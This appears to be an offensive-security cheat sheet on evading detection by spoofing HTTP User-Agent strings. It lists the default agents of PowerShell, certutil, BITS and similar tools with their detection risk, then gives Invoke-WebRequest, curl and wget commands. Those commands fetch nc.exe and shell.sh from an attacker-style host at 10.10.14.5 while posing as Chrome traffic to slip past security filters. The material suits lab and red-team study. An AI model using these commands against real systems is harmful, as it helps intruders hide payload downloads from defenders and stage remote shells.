# Detection Evasion
## User-Agent Fingerprinting & Spoofing
**Context:** Every HTTP request sends a "User-Agent" (UA) header identifying the client software. 
**Risk:** Security tools block or alert on default CLI strings (e.g., `WindowsPowerShell`, `curl`, `python-requests`). 
**Goal:** Masquerade your traffic to look like a legitimate user browsing the web (e.g., Chrome, Edge).
### 1. The Risk: Default Fingerprints
**Blue Team Perspective:** A firewall sees a request from `Microsoft-CryptoAPI/10.0` reaching out to an unknown IP. This is an immediate Indicator of Compromise (IoC).

| **Method**             | **Default User-Agent String**       | **Risk Level**                                                                              |
| ------------------ | ------------------------------- | --------------------------------------------------------------------------------------- |
| *PowerShell (IWR)* | `WindowsPowerShell/5.1.14393.0` | **High** (Obvious script/malware usage).                                                |
| *Certutil*         | `Microsoft-CryptoAPI/10.0`      | **High** (Known LOLBin usage).                                                          |
| *BITS Admin*       | `Microsoft BITS/7.8`            | **Medium** (Can be legitimate update traffic, but suspicious to non-Microsoft domains). |
| *WinHttpRequest*   | `WinHttp.WinHttpRequest.5`      | **High** (COM Object scripting).                                                        |
| *Python*           | `python-requests/2.25.1`        | **Medium** (Common dev tool, but suspicious on user workstations).                      |
### 2. Enumerating Available Agents (PowerShell)
**Goal:** See what built-in User-Agent strings PowerShell defines for you.
```powershell
# List all predefined User-Agent properties in PowerShell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```
### 3. Spoofing with Invoke-WebRequest (IWR)
**Goal:** Change the header to bypass filters.
#### Method A: Using Built-in Presets
**Description:** Use PowerShell's internal definitions for cleanliness.
```powershell
# 1. Select the 'Chrome' preset
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome

# 2. Execute Request (Looks like Chrome browser traffic)
Invoke-WebRequest http://10.10.14.5/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```
#### Method B: Custom String (Best Practice)
**Description:** Copy a specific User-Agent string from a real browser to blend in perfectly.
```powershell
# Define a standard Windows 10 Chrome UA
$UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

# Execute
Invoke-WebRequest http://10.10.14.5/nc.exe -UserAgent $UA -OutFile "nc.exe"
```
### 4. Spoofing with Other Tools
**Context:** Apply the same logic to Linux tools.
#### Curl
```powershell
# -A: Set User-Agent
curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" http://10.10.14.5/shell.sh -o shell.sh
```
#### Wget
```powershell
# -U: Set User-Agent
wget -U "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" http://10.10.14.5/shell.sh
```